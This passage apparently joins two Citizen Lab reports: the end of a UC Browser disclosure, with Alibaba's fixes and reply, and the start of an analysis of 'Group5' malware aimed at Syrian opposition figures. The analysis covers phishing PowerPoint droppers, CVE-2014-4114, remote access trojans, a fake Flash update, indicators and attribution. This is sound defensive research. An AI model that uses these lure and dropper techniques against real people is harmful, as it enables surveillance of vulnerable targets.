for updating their code, exposing another vector which can be exploited by attackers. The problem of vulnerable software update processes has been previously discussed. Underscoring the complexity of securely updating software, other documents disclosed by Snowden indicated that the Five Eyes intelligence alliance also sought to deliver targeted malware by hijacking software updates delivered to the Google and Samsung app stores. \nWhile the challenge of ensuring the security and integrity of user data and devices is complex, there are established practices that developers can follow. The secure transmission of sensitive data should follow industry-standard practices, like the use of asymmetric encryption and well-tested implementations such as OpenSSL. Although Alibaba’s Privacy Policy states that the company uses “a variety of industry-standard security technologies and procedures to help protect your Personal Information”, the use of non-standard, symmetric encryption algorithms suggests otherwise.\nHowever, transmitting user data in a more secure manner is only the first step of the data processing chain. Companies who collect the abundant data generated by our devices will store, analyze and potentially share that data; additional steps that must also be performed in a more secure manner.  While implementing more secure methods of transmission in UC Browser may limit the risk data is intercepted in transit, it does not secure such data as it is stored, used and shared by Alibaba.\nPerhaps the most straightforward way of ensuring the integrity of user data is simply not to collect it in the first place. While many companies, including Alibaba, seek to leverage the vast quantity of user data they have available for their own competitive purposes, minimizing what data points are collected is the simplest way of ensuring such data is not misused or exposed to unnecessary risk. As the ecosystems of companies such as Alibaba continue to expand, incorporating new applications and features, without a more diligent approach focused on user privacy, the risks to users will only continue to grow.\n\nUpdate: Analysis of updated Android and Windows versions of UC Browser\nOn May 17, 2016, Alibaba sent us two updated Android APK’s for testing: versions 10.9.9.739 and 10.9.0.731 of the Chinese and international editions, respectively, of UC Browser. Our analysis of these APKs found that most of the previously identified data leaks had been fixed in these versions by using SSL to transmit sensitive data. The two exceptions were transmissions to sugs.m.sm.cn and puds.ucweb.com. While our analysis found that the browser no longer sends sensitive data to puds.ucweb.com, we did find that search terms entered into the address bar were still sent to sugs.m.sm.cn in an insecure manner. For transmission to both of these domains, the updated versions switched to a different symmetric algorithm which was equally as insecure as the version it replaced. The company identified that they would eventually switch transmission of data to these two sources to SSL by an unstated future date. In addition to the problems noted above, these versions still had unfixed data leaks to applog.uc.cn and utop.umengcloud.com.\nAfter we notified the company of these issues, on May 24, 2016 they sent us two further updated Android APKs for testing: version 10.10.0.800 (Chinese) and 10.10.0.796 (international). These versions no longer leaked data to applog.uc.cn and utop.umengcloud.com; however, the use of the easily decrypted symmetric algorithm to transmit data to sugs.m.sm.cn and puds.ucweb.com was still present.\nOn May 27, 2016, Alibaba notified us that they had fixed all the reported issues with the Windows versions of the browser, and that updated versions were available on their website. On June 3, 2016, we downloaded and analyzed the latest Windows versions of the Chinese (5.6.12860.10) and international (5.6.12265.1017) editions of UC Browser.  We found that all  leaks we reported were fixed by switching to the use of SSL.  Moreover, the software update vulnerability was also fixed by using SSL to protect the downloaded update metadata.\nAcknowledgments\nThanks to Andrew Hilts, Sarah McKune, Jason Ng and Masashi Crete-Nishihata for assistance with this report.

The letter is reproduced here.\nOn June 8, 2016, a representative from Alibaba sent us the following response:\n\nHi Ronald,\nNice to meet you by e-mail.  We appreciate your team's collaboration and interest in raising security matters for our consideration and discussion. We are quite happy to work with you, and we consider your recommendations to be helpful and in parallel with our ongoing product development process.  Our technical team has confirmed as of end of May 2016 that the data security items raised by Citizen Lab have been fixed.  As you know, our team has forwarded both the Android and PC upgraded versions to you at the end of May for your team's review and we have been pleased that your team confirmed our revisions to the Android sufficiently addressed your concerns.  We look forward to your feedback on the upgraded PC version. \nWhile we appreciate and worked to address the items you have raised, we do not believe that consumer personal information has been placed at risk by use of our browser. \nWe take our users’ privacy seriously and we rely on universal privacy principles to guide our business.  We strive to adhere to the principle of data minimization by collecting and storing data that is actually used to provide our services Our data collection and use practices are consistent with general industry norms.  We will of course continue to review our practices and to revise and improve our policies when appropriate. \nUCWeb was acquired by Alibaba in 2014 and operates independently as a subsidiary company.  We do not have insight into the data security or privacy practices of Alibaba generally, or of other products which are offered by it.  We are not able to respond to issues you have raised about other Alibaba products.  \nThank you again for contacting us. We will keep working to improve our product and service, and we welcome constructive conversations with third parties that may lead to additional improvements and innovations at UCWeb.\n\nThe following table lists our all communications with Alibaba related to the security and privacy issues we identified in UC Browser:\n\n\n\nDate\nContact\n\n\nApril 12, 2016\nWe contacted Alibaba in order to determine who to submit our disclosure to.\n\n\nApril 13, 2016\nWe submit written description of technical findings via email\n\n\nApril 14, 2016\nWe have an initial call with UCWeb/Alibaba security engineers\n\n\nApril 18, 2016\nAlibaba request a follow-up call to discuss the vulnerabilities\n\n\nApril 19, 2016\nWe have another phone call with Alibaba engineers. They commit to implementing a series of fixes on the Android client within 6 weeks: They will no longer collect the IMEI or IMSI of users; they will use asymmetric encryption to transfer some collected user data. They also commit to encrypting the transmission of the URLs of all pages viewed in the browser at a later date. They commit to sending us an email describing these proposed fixes in more detail. There are no commitments regarding the Windows version of the client.\n\n\nApril 25, 2016\nAlibaba sends an email outlining the fixes they will make to the Windows version of UC Browser. They will begin using HTTPS to correct the issues we identified in Part 1 of this report: the leaking of identifying data with easily decryptable encryption, the leaking of pages via mmstatt.ucweb.com and the vulernable update process. They also note that they do not consider the sn value (which contains numerous hardware serial numbers) to be personally identifiable information.\n\n\nApril 26, 2016\nAlibaba confirms that the fixes described on April 25th apply to both the Chinese and international versions of the Windows client. In addition, they state they will be contacting us at a future date to discuss fixes for the Android client.\n\n\nApril 29, 2016\nAlibaba sends a summary of proposed fixes for both the Windows and Android versions of the client, and commits to implementing these fixes by May 15, 2016. They outline a series of fixes for the Android client, including using HTTPS in place of HTTP, using a “new encryption algorithm”, and no longer sending the IMEI/IMSI in some, but not all, of the data leaks we identified. The proposed fixes indicate that personal data points such as the user IMSI and IMEI will continue to be sent in some cases, but with HTTPS encryption. In addition, the software update process will be protected by a “new encryption algorithm”.\n\n\nApril 30, 2016\nAlibaba confirms that the they will implement a new encryption algorithm in the Android version to replace the algorithms used during the software update process and during the transmission of data to sugs.m.sm.cn.\n\n\nMay 17, 2016\nAlibaba provides APks of updated Chinese and International versions of the Android client for review.\n\n\nMay 21, 2016\nWe identified a number of problems which remained in the updated APKs sent May 17, 2016. User data including IMEI was sent to applog.uc.cn via HTTP.\n\n\nMay 24, 2016\nAlibaba provided two updated APks in response to the issues we identified on May 21. They state that they intend to switch the transmission of some data points to HTTPS at a future date.\n\n\nMay 27, 2016\nAlibaba notifies us that all the issues we identified in the Windows version have been fixed and the updated installers were available for download.\n\n\nJune 3, 2016\nWe sent Alibaba a letter with additional questions about privacy and security issues in UC Browser.\n\n\nJune 8, 2016\nAlibaba representative responds to our letter\n\n\n\n\n\t\t\t\t\n\t\t\t",

    "description": "*The Citizen Lab at the Munk School of Global Affairs, University of Toronto; **Lookout Inc.",
    "text": "\n\t\t\t\tBy John Scott-Railton,* Bahr Abdulrazzak,* Adam Hulcoop,* Matt Brooks,* & Katie Kleemola** \n*The Citizen Lab at the Munk School of Global Affairs, University of Toronto; **Lookout Inc.\nRead the Associated Press exclusive,\nRead the op-ed by Citizen Lab Director Ron Deibert.\nOther media: BoingBoing, BBC, Voice of America Persian, IB Times, Softpedia, Asharq Al-Awsat, AlArabiya, SecurityWeek, SC Magazine, Okaz, Milliyet, Twsas, Radio Sawa, Foreign Policy, Schneier on Security.\nExecutive Summary\nThis report describes an elaborately staged malware operation with targets in the Syrian opposition. The operators use a range of techniques to target Windows computers and Android phones with the apparent goal of penetrating the computers of well-connected individuals in the Syrian opposition.\nWe first discovered the operation in late 2015 when a member of the Syrian opposition spotted a suspicious e-mail containing a PowerPoint slideshow. From this initial message, we uncovered a watering hole website with malicious programs, malicious PowerPoint files, and Android malware, all apparently designed to appeal to members of the opposition.\nElements of the Syrian opposition have been targeted by malware campaigns since the early days of the conflict: regime-linked malware groups, the Syrian Electronic Army, ISIS, and a group linked to Lebanon reported by FireEye in 2015 have all attempted to penetrate opposition computers and communications. Some of these operations are still active as of the time of writing. This report adds one more threat actor to the list: Group5, which we name to reflect the four other known malware groups.\nGroup5 stands out from the operations that have already been reported on: some of the tactics and tools used have not been observed in this conflict; the operators seem comfortable with Iranian Persian dialect tools and Iranian hosting companies; and they appear to have run elements of the operation from Iranian IP space.\n\nLike a chameleon, Group5 borrows opposition text and slogans for e-mail messages and watering holes, showing evidence of good social engineering and targeting. However, Group5’s technical quality is low, and their operational security uneven. This is a common feature of many operations in the Syrian context: since the baseline security of many of the targets is very low, many successful threat actors seem to conserve (and in some cases not possess) more sophisticated techniques. We believe we identified Group5 early in its lifecycle, before all of the malware that had been staged and prepared could be deployed in a full campaign.\nOur analysis indicates that Group5 is likely a new entrant in Syria, and we outline the circumstantial evidence pointing to an Iranian nexus. We do not conclusively attribute Group5 to a sponsor, although we suspect the interests of a state are present, in some form. Group5 is just the latest addition to an expanding cast of actors targeting Syrian opposition groups, and its entry into the conflict shows the continuing information security risks that they face.\nBackground: The Perpetual Targeting of the Syrian Opposition\nSyrians have experienced monitoring and blocking of their electronic communications for many years. As a result, many more technically literate Syrians have familiarized themselves with VPNs and other tools to circumvent simple blocking, and achieve a degree of privacy. After the 2011 Uprising began, the regime disconnected telecommunications services in many areas controlled by opposition groups. This led, in these areas, to the widespread adoption of satellite internet connectivity, mostly via VSAT (Very Small Aperture Terminal) services like Tooway and iDirect, and to a lesser extent the use of BGAN (Broadband Global Area Network) terminals.\nAt the same time, the Syrian opposition’s activities outside the country, both in neighboring countries like Turkey, as well as in the diaspora, dramatically increased. Much of this activity takes place over social networks, free e-mail accounts like Gmail (and Google Apps for Work), and via tools like Skype’s VoIP services.\nThese shifts in connectivity limited the effectiveness of the passive monitoring and blocking used by the Al Assad Regime, and frustrated its abilities to monitor the opposition.\nHowever, the shift towards social networks and other online tools has created new opportunities for the regime to target the opposition. Opposition members constantly share information, files, tools and programs, via social media. This highly-connected environment enables them to be highly aware of changing events, and quickly mobilize resources. In addition, a number of online services, such as the Google Play Store, are blocked or restricted for Syria. As a result, a culture of sharing Android APK files has also developed.\nThe heavy reliance on popular online platforms, and regular sharing of tools, presents many opportunities to seed malicious files. For the regime, a successful operation means a chance to regain visibility into the activities of groups within the geographic borders of Syria, while extending their reach outside into the diaspora. For other groups, such as ISIS, the digital vulnerability of the opposition presents an opportunity to develop a capability against opposition communications. The following section outlines several of these known threat actors.\nRegime-Linked Groups\nThe most well-known threat actor to target the Syrian Revolution is the Syrian Electronic Army (SEA). However, many of the targets of the SEA have been Western organizations, although the SEA continues to conduct lower-profile operations that include malware against the opposition. Less notorious, although still the subject of reporting, are malware groups linked to the regime. These malware groups have been active since 2011, and have used a wide range of Commercial-Off-The-Shelf (COTS) Remote Access Trojans (RATs) to target the opposition. Typically, these groups bundle RATs with a wide range of documents and programs designed to appeal to the opposition. Over the years, these campaigns have included everything from “revolution plans,” lists of “wanted suspects,” to fake security and encryption tools. These campaigns have been extensively characterized by reports from the Citizen Lab, The Electronic Frontier Foundation, and private companies like TrendMicro and Kaspersky. A range of reports have documented these regime-linked campaigns over the years.\nPro-Regime Groups Outside Syria\nThere is also evidence of pro-Assad groups outside Syria participating in malware campaigns against opposition. Notably, a group reported on in 2015 by FireEye (in collaboration with one of the authors of this report) used female avatars to send trojaned documents to high profile figures in opposition politics, aid, and armed groups. The operation yielded over 31,000 conversations, and a trove of sensitive information about a variety of groups’ plans and activities. This group also made use of fake matchmaking websites and social media accounts to backstop their deception.\nISIS-Linked Groups\nOn a different side of conflict, the Citizen Lab documented a malware operation linked to ISIS against the group ‘Raqqa is Being Slaughtered Silently’ (RBSS) in 2015. The operators, masquerading as a group of RBSS sympathizers based in Canada, targeted victims with a file that claimed to contain locations of ISIS forces and US Airstrikes within Syria. The file actually contained custom malware that collected and transmitted information about the infected computer. The report concluded that there was strong circumstantial evidence linking the malware to members of ISIS.\nMany Groups, Similar Tactics\nEach of these groups has distinct Tactics, Techniques and Procedures (TTPs). However, one common thread among the many publicly-reported groups is that they rarely use exploits in their campaigns, instead relying heavily on social engineering and trickery to convince targets to execute malicious files, disguised as innocuous documents.\nThis may reflect some of these groups’ lack of technical sophistication. For example, many regime-linked groups seem to have very limited skills and technical resources, and rely almost entirely on RATs coupled with well-informed social engineering. These techniques have evolved, but not improved radically since 2011. In other cases, such as the Lebanon-linked group reported on by FireEye, operators may have access to more sophisticated techniques, but see little reason to use them against their targets, given the limited technical capabilities of the opposition.\n\nPart 1: Discovering Group5\nThis section describes the e-mails that first alerted us to an operation targeting the Syrian political opposition in October 2015.\nOn October 3rd 2015, Noura Al-Ameer, a well-connected Syrian opposition political figure, negotiator, and former Vice President of the opposition Syrian National Council (SNC), received a suspicious e-mail.1 The e-mail purported to come from a human rights documentation organization she had never heard of: “Assad Crimes.” The sender, using the e-mail address office@assadcrimes[.]info claimed to be sharing information about Iranian “crimes,” a theme familiar to many in the opposition.\nFig. 1: Noura Al-Ameer, former SNC Vice President and a target of the operation. An activist from Homs, Syria, Al-Ameer was detained and tortured in the security branches, later moved to the infamous Adra prison in Damascus, prior to fleeing the country several years ago. Today, she is a delegate to the SNC’s political council and works to document war crimes committed during the conflict. Her identity was falsely used to register the assadcrimes website.\nInterestingly, Al-Ameer’s own name was used in the assadcrimes[.]info domain registration, along with other false information (we speculate on the reason for using her name in Part 6: Analysis of Competing Hypotheses).\nAlong with a brief pretext in the Subject and Body, the e-mail also contains an attached Microsoft PowerPoint Slideshow (PPSX) document that, when clicked, directly opens and runs a PowerPoint slideshow.\nE-mail 1: The Initial Message (Dropper Doc 1)\nOn October 3rd 2015, Al-Ameer received the initial e-mail message, containing the first malicious file:\n\nTranslation:\nFrom: office@assadcrimes[.]info\nTo:\nSubject: Iran is killing the Pilgrims in Mina\nBody: Iran’s Crimes in the Kingdom of Saudi Arabia\nExamination of the header of the message indicates that the message was sent via 88.198.222[.]163, the same IP address as the Command & Control (C2) for the malware dropped by the file (See Part 3: Windows Malware).\nAssadcrimes.ppsx\nMD5 : 76F8142B4E52C671871B3DF87F10C30C\nCommunication with the Operator\nAl-Ameer, who is no stranger to digital threats, recognized that the e-mail was suspicious, and on our instruction made contact with the operator, hoping to elicit further malware.\nAl-Ameer’s E-mail:\n\nTranslation:\nFrom: [Redacted]\nTo: office@assadcrimes[.]info\nBody:\nHello\nThe file didn’t work ….

The documents also provide a historical overview of Iranian-linked “attacks” and other events in the Kingdom of Saudi Arabia.\nFigure 2: Screenshot from a slide referred to an Iranian attack in 1984 against petrochemical facilities in Saudi Arabia.\nTranslation:\nOn 1404 A.H – 1984 A.D Iranian warship attacked Saudi Arabia\nOn 1404 A.H, two Iranian war planes headed to Jubail industrial city, to bomb and hit critical factories (Petrochemical factory) and by god’s well, the Saudi’s air forces was able to hit one plane, while the other managed to escape.\nWhen opened, both files download malware onto the victim’s machine. Malware from these files is analyzed in Part 3: Windows Malware.\n\nPart 2: The Assadcrimes Website\nGroup5 operated a website, assadcrimes[.] info that served as a watering hole for Android and Windows malware. This section outlines the various files hosted on the site.\n\nAfter the initial e-mails, we began to monitor a website linked to the e-mails: assadcrimes[.]info. At the time of these e-mails (Oct. 3, 2015), the site was not fully functional. However, within a few days (Oct. 11, 2015) the main page displayed “Posts Tagged Bashar Assad Crimes” with content apparently critical of Bashar Assad. The content appears to have been scraped from an opposition blog, as well as from other opposition sites. This blog was created in the name of Tal al-Mallohi, known as Syria’s youngest prisoner of conscience. The original blog creation predates the current unrest in Syria.\nFigure 3 : Screenshot of the website taken in April 2016 (assadcrimes[.]info).Shortly before this publication of Group5, the website was listed as “expired” and parked, indicating that the owner chose not to renew the domain.\nGroup5 Staging and Targeting\nMalware Seeding on the Website (Dropper Doc 3)\nWhile monitoring the website, we identified several directories that auto-download a further malicious file (assadcrimes.info.ppsx). These links seem designed for other forms of social engineering, perhaps using similar bait to the messages targeting Al-Ameer. The Assadcrimes.info.ppsx file concerns the Syrian conflict, with characters and cartoons culled from social media and online sites.\nFigure 4 : A slide from the file Assadcrimes.info.ppsx\nTranslation:\nA new Play in Syria\nRussian-American plan to divide the Syrian cake.\nWhen viewed, the victim’s computer is silently infected with malware (See Part 3: Windows Malware).\nAssadcrimes.info.ppsx\nMD5: 30BB678DB3AD0140FC33ACD9803385C3\nMartyred Children (Decoy Dropper 4)\nElsewhere on the site we found several HTML pages that, when visited, triggered the downloading of a malicious executable named “martyred children” (alshohadaa alatfal.exe). When executed, the program pulls images hosted on assadcrimes[.]info of the Ghouta Chemical Attacks, while simultaneously infecting the target machine with malware.\nFigure 5 : showing screenshot of ‘alshohadaa alatfal.exe’ running. Images blurred by the authors.\nMalware from the website is described in Part 3: Windows Malware\nalshohadaa alatfal.exe\nMD5: 2FC276E1C06C3C78C6D7B66A141213BE\nAndroid Malware\nWhile examining the assadcrimes[.]info website, we identified Android malware, seeded via a fake Adobe Flash Player update notification. We describe this Android malware in detail in: Part 4: Android Malware.\nadobe_flash_player.apk\nMD5: 8EBEB3F91CDA8E985A9C61BEB8CDDE9D\n\nPart 3: Windows Malware\nGroup5 used (or was staging) a range of malware in this operation, ranging from malicious PowerPoint slideshows using exploits to executable files that directly drop malware. A comprehensive analysis of their malware is found in Appendix A: Windows Malware Analysis.\nMalicious PowerPoint\nThe initial Group5 targeting that we observed in the e-mails to Al-Ameer included PPSX documents as a vehicle for malware using two different techniques: (1) executing OLE objects using animation actions within a PowerPoint slideshow and; (2) using CVE-2014-4114 to drop and execute malicious code.\nIn assadcrimes.ppsx the operators embed an OLE Package object within a PowerPoint slideshow. When displayed as an animation, the object is executed while the slideshow is viewed, a technique that has been previously described (for more detail, see Appendix A: Dropper Doc 1 & Appendix A: Dropper Doc 3). In this case the user is presented with a prompt asking whether they wish to run the object.\nFigure 6: The malicious executable within the PowerPoint slideshow, when viewed in edit mode. A victim double clicking on the slideshow would not be shown the object.\nIn the assadcrimes1.ppsx, the operator has created a PowerPoint file that leverages CVE-2014-4114, a vulnerability in the OLE packager component of the Windows operating system (See Appendix A: Dropper Doc 2).\nDecoy Applications\nThe operators have also created a decoy application, hosted on assadcrimes[.]info, that displays images of child victims of the 2013 Ghouta Chemical Attacks. When executed, the application silently decrypts and drops the malware (See Appendix A: Decoy Dropper 4).\n\nThe RATs\nThe operators use these techniques to deliver two commonly available Remote Access Trojans (RATs): njRat and NanoCore RAT. In both cases, Group5 disguised the malicious binaries with several layers of obfuscation, including crypting and packing to reduce the possibility of detection by antivirus software.\nBoth RATs provide a wide range of functionality on the target machine, ranging from collecting files, watching the screen, to capturing passwords and keystrokes. The RATs also enable the operator to remotely delete files, and spy on the computer user via the microphone or webcam.\nFigure 7 : Screenshot of njRAT working, and accessing the victim’s files.\nAntivirus Detection\nOn July 26, 2016 we conducted a VirusTotal search for the MD5 hashes of each of the files encountered during this operation. The results, provided in Appendix D: File Hashes, were consistent with a highly focused or targeted operation in that only two of the 16 (12.5%) unique MD5s were found.\n\nPart 4: The Android Malware\nWhile examining assadcrimes[.]info, we determined that the site was also hosting a decoy Flash Player update page. This page, located on a subdomain, included a download link to a malicious Android APK. For a full analysis of this malware see Appendix B: Android Malware.\nWhile examining the website we found that the operators had prepared Android malware masquerading as an Adobe Flash Player update notification. Clicking on the “Update” link (See Figure 8) downloads a malicious file, masquerading as a software update.\nFigure 8: Screenshot from the subdomain that was used to host the fake Flash Player update page.\nThe APK is an instance of DroidJack. According to Symantec, this malware evolved from an older codebase known as SandroRAT. The RAT provides a wide range of functionality, enabling the operator to capture messages, contacts, photos and other materials from the device. In addition, DroidJack can also remotely activate the phone camera and microphone, without notifying the victim. Figure 9 shows some of the functionality available.\nFigure 9: DroidJack server list of commands.\nA more extensive analysis of the DroidJack malware, can be found in Appendix B: Android Malware. Interestingly, DroidJack has also emerged recently, bundled with versions of Pokémon Go.\nThis approach to mobile malware seeding, while cumbersome, might be assumed to have greater success in the target group of Syrians than other populations. It is common for Syrians to share Android APK files outside the Google Play Store, as Google Play Services are not available within Syria. This practice carries over to the Syrian diaspora in other countries, despite the availability of Google Play. As a result, we suspect that most devices are set to accept APK files from unknown developers.\n\nPart 5: Attribution\nGroup5 left a number of clues as to their origin and identity, including the tools they used, where they hosted their website and C2, and how they accessed the website. Notably, Group5 may have also been using a customized version of an Iranian obfuscation tool.\nThis section provides an overview of the clues left by Group5 on the website, and in the malware. First, we analyze logs that the operator mistakenly left publicly visible on the assadcrimes[.]info website. These logs include not only the visitors to the site, but also the IP addresses and user agent strings that belong to the operator as she or he logged into the site during the development phase. These artifacts provide interesting clues as to the operator’s identity and operational security practices, such as using a VPN, and suggest a strong Iranian nexus.\nSecond, we note the use of Persian-language tools in Group5, from the mailer to the packer.\nFinally, we analyze a recurrent theme in the binaries: “Mr. Tekide” – a name that appears regularly in the implants. We link this name to the Iranian developer of a series of malware tools, several of which were used in this operation. Additionally, we examine the circumstantial evidence connecting this developer to Group5’s activities.\nUnprotected Logs\nSeveral key directories on the assadcrimes[.]info site were left as public, including a folder containing the website logs, a feature Group5 seems to have enabled early in the operation. These logs date to the early development and operation of the website, and reveal interesting clues about operator origin and operational security.\nAfter processing the logs to remove crawlers belonging to Google, Bing, Yandex and others, we scrutinized the logs of the site for evidence of victims, but were unable to locate any victim IPs with high confidence.\nIdentifying the Operator from Website Logs\nWhile the logs provided few clues as to victims, they proved to be exceptionally useful for identifying the IP addresses used by Group5 as they developed the site. Looking at the earliest logs in the set, from October 11, 2015, we find the operator accessing the site hourly from an Iranian IP block as the development continues.\nFigure 10: Screenshot of 11th October 2015 log, showing list of IP’s and referrer from hostnegar[.]comThe first logged visits to the site come from the IP address 37.137.131[.]70, which belongs to a block registered to ‘Rightel Communication’, an Iranian mobile phone network operator.\ninetnum: 37.137.128[.]0 – 37.137.255[.]255\nnetname: RighTel\ndescr: “Rightel Communication Service Company PJS”\ncountry: IR\nadmin-c: RP12366-RIPE\ntech-c: RP12366-RIPE\nstatus: ASSIGNED PA\nmnt-by: TA59784-MNT\ncreated: 2013-08-20T11:13:17Z\nlast-modified: 2014-05-17T05:28:10Z\nsource: RIPEperson: RighTel PJS\naddress: 9th floor, Chooka Building, No 8 , west Armaghan Street, Vali-e-Asr Street\n(After Niayesh Highway), Tehran, Iran\nphone: + 982127654530\nnic-hdl: RP12366-RIPE\nmnt-by: TA59784-MNT\ncreated: 2014-05-17T05:23:47Z\nlast-modified: 2014-05-17T05:23:47Z\nsource: RIPE\nFurther confirming the link is that the operator’s traffic includes a referrer from the Iranian hosting company (hostnegar[.]com) for the site.\nFigure 11: Hostnegar’s login page\nTracing the operator through an initial UserAgent string (a version of Windows NT 6.3)2 and IP address, we found them accessing the site from an iPhone, other Iranian IP addresses, as well as VPNs.\nFigure 12: User agents for the site owner, accessing the website from Iranian IPs and VPN.\nAdditionally, the operator accessed the site directly from the malware’s C2 server (88.198.222[.]163).\nFigure 13 : User agents for the site owner, accessing the website from the C2, and using VPNs.\nThese links provide evidence for an Iranian nexus, and suggest that the operator may have been taking steps to conceal their true origin IP. However, these steps were not well executed, which enabled us to track Group5 as they continued to access the site.\nInterestingly, after the flurry of activity in October 2015, by November-December the operator accessed the site only 7 times, and between January-February 2016 only twice (it is possible we have missed some access attempts that appear to be innocuous traffic). We concluded from this that Group5 may have stepped back from the site at some point after the New Year.\nA Persian-language Mailer\nBefore the assadcrimes[.]info page was fully populated with decoy content, we found that the site was hosting a Persian-language mailer (See Figure 14 below). We were not able to determine how the mailer was being used by Group5, as it was not observed sending any of the e-mails we were able to analyze.\nFigure 14: A screenshot for the mailer as it was on October 4, 2015.\nLinks to Known Threat Actors\nGroup5 appears to have used only a single shared web hosting provider and a single command and control IP address for this operation. We are unsure whether this strategy was the product of limited resources, an effort to compartmentalise the operation from other activities, or simply a highly targeted operation with a specific focus.\nThe narrow infrastructure and small number of observed targets limited our search base for potential infrastructure overlap with known groups. In a holistic evaluation of the campaign, we failed to identify links with the TTPs of previously documented threat actors or groups active in Syria. We also failed to find a link in searches of malware databases and open source searching.\nOn the level of TTPs, superficially there is similarity between this group and other active groups originating in Iran. The group multiply documented by Palo Alto Networks, which they call “Infy,” is also known to use PowerPoint files in their targeting, although we found no overlap in infrastructure. Furthermore, their targeting (according to what Palo Alto Networks has said publicly) is slightly different, and involved PowerPoint 97-2003 documents (not PPSX files) during the same period in which Group5 was using a different tactic.\nWe cannot not rule out the possibility that a known group is behind this operation, and that we missed or lacked access to a key piece of evidence that would link such a group to Group5’s infrastructure or tools. One interesting direction for further investigation came from analysis of the tool used to obfuscate the RATs, which yielded a number of interesting connections to known threat actors and tools. Notably, the PAC Crypt tool, and Mr. Tekide, the alias of an Iranian malware developer.\nPAC Crypt\nCommonly used in malware campaigns, crypters are programs which are designed to disguise the underlying malicious binary by hiding it within a layer of obfuscation which is then deobfuscated at the time of execution. In this way, crypting a malicious binary provides a level of protection against signature-based endpoint security tools such as antivirus. In Appendix A we describe the discovery of a series of strings which suggest that both the njRAT and NanoCore RAT payloads were built, and then subsequently obfuscated using a crypter tool named ‘PAC Crypt’.\nCareful inspection revealed that the crypter in this case had been compiled in debug mode, thus preserving PDB reference data. PDB file references are common in .Net applications when compiled in ‘debug’ mode, and they frequently reveal the original file path of the application source code on the developer’s computer.\nBelow are the PDB strings discovered when examining the ‘crypted’ njRAT and NanoCore files:\n\n\n\nReference: Doc Dropper 1 Crypter\nMD5: a4f1f4921bb11ff9d22fad89b19b155d\nCompile Time: 9/30/2015 00:02:51\n\n\nc:\\users\\mr.tekide\\documents\\visual studio 2013\\projects\\paccryptnano core dehgani -vds\\windowsapplication2\\obj\\debug\\launch manager.pdb\n\n\n\n \n\n\n\nReference: Doc Dropper 3 Crypter\nMD5:6161083021b695814434450c1882f9f3\nCompile Time: 10/6/2015 02:13:45\n\n\nC:\\Users\\mr.tekide\\Documents\\Visual Studio 2013\\Projects\\paccrypt11njratmalii\\paccryptalipnahzade\\obj\\Debug\\LManager.pdb\n\n\n\nThese PDB strings reveal two facts relevant to the discussion of attribution. The first is that the username of the individual who compiled the .Net application in both cases was ‘mr.tekide’. The second is that in both PDB strings we find not only a reference to the malware crypter used (a tool called ‘PAC Crypt’), but also an explicit reference to the crypted malware payloads – ‘nano core’ and ‘njrat’.\nThese two facts together suggest that an individual having the username ‘mr.tekide’ compiled a copy of PAC Crypt for specific projects involving njRAT and NanoCore RAT.\nA common usage scenario for a malware crypter involves an operator purchasing a copy of the crypter in a compiled form (or using a cracked version), then using the crypter to obfuscate the malware executable which is to be distributed. In this scenario the developer of the crypter has no knowledge of what specific malware the threat actor will eventually choose to encrypt with the purchased copy of the crypter.\nThe fact that the ‘PAC Crypt’ PDB strings discovered in this case contained the ‘njrat’ and ‘nano core’ references is therefore noteworthy because it indicates the possibility of prior knowledge of the precise malware payload which was to be crypted.\nResearch into the PAC Crypt tool revealed that this program is developed and sold by an Iranian malware developer known as ‘Mr. Tekide’.\nMr. Tekide\nMr. Tekide is the online alias of an Iranian malware developer who is also the administrator of the website http://crypter[.]ir, an Iranian hacking forum and online shop. Notably, this storefront offers various hacking tools and services, including the aforementioned ‘PAC Crypt’ (see figure 15 below).\n\n\n\n\n\n\n\n\nFigure 15: Crypter[.]ir main page (left), and contact page (right)\nIn addition to the crypter[.]ir forum and shop, Mr. Tekide appears to be in the midst of creating a new online storefront for selling his various malware tools and services. The content shown in Figure 16 below, obtained from http://crypting[.]org, shows a ‘rat service’ being offered to visitors. The store also touts a Windows Rootkit (“coming soon”) and various ‘exploits.’\n\n\n\n\n\n\n\n\nFigure 16: Crypting[.]org main page (left), list of hacking services offered (right)\nMr. Tekide also maintains an active presence as a moderator on the Ashiyane forums,3 an Iranian security discussion board run by the Ashiyane Digital Security Team (ADST). The ADST is a well-known Iranian security and hacking group which has earned notoriety for its prolific website defacement activities. These defacements invariably contain a list of ADST ‘defacers’ alongside the phrase ‘We Love Iran’.\nWeb site defacements conducted by ADST have explicitly named Mr. Tekide as a member, as shown in Figure 17 below.\nFigure 17: an Ashiyane Digital Security Team defacement page, naming Mr. Tekide\nIn addition to its defacement activities, ADST has been recently linked to the indictment by the US Department of Justice of seven Iranian nationals for cyber attacks against the US financial sector. In its indictment, the Department of Justice alleges that members of two Iranian security companies, ITSecTeam and Mersad Company, were responsible for Distributed-denial-of- Service (DDoS) attacks against numerous US bank websites between September 2012 and May 2013. The DoJ indictment also describes that Mersad was founded by members of the ADST, and furthermore that ADST had made prior public claims regarding its activities on behalf of the Iranian Government.\nAdditional open source information about Mr. Tekide is included in Appendix C: Mr. Tekide.\nA Consistent Iranian Nexus\nWe cannot conclude with certainty that Group5 is Iran-based, although the confluence of information outlined above provides a circumstantial case. The IP addresses observed during early stages of development of the Assadcrimes website, as well as the Iranian hosting provider and the Persian language mailer, all speak to a level of Iranian presence. The additional apparent involvement of an Iranian malware developer with ties to a known Iranian cyber actor, whether his involvement was unwitting or intentional, only strengthens the Iranian connection.\n\nPart 6: Analysis of Competing Hypotheses\nThis section evaluates several competing hypotheses for explaining the identity of the operator. While we cannot conclusively support one of these hypotheses, we think the most plausible is that this operation is the work of an Iranian group newly active in Syria.\nWe believe we found Group5 fairly early in the process of preparing a larger malware campaign, thanks to Noura Al-Ameer’s vigilance. This gave us unique visibility into some of their staging, but we had only a limited view of other possible targeting. Group5’s reliance on a narrow infrastructure limited our ability to connect the operation to other known groups, as discussed above.\nWith these caveats and limitations in mind, we outline the known elements of the operation, and evaluate several hypotheses: (Hypothesis 1) an Iranian group newly active in Syria; (Hypothesis 2) that the operation is from known regime-linked groups, like the Syrian malware groups; and (Hypothesis 3) that it is from some other unknown group. After addressing the fit of each hypothesis with available evidence, we provide an overall evaluation of the three, and conclude that Hypothesis 1 provides the best explanation for what we have observed.\nHypothesis 1: Iranian Group Newly Active in Syria\nA group previously unreported in Syria with uneven skills but displaying thought and care in selecting the target, and preparing the operation, with an Iranian nexus and a possible government connection.\nPreviously Unseen in Syria: We have been unable to find a high-confidence overlap in infrastructure or malware to previously-reported groups active around Syria. We also had difficulty connecting the operation to other known groups in the global threat actor space. Furthermore, the use of exploits, as well 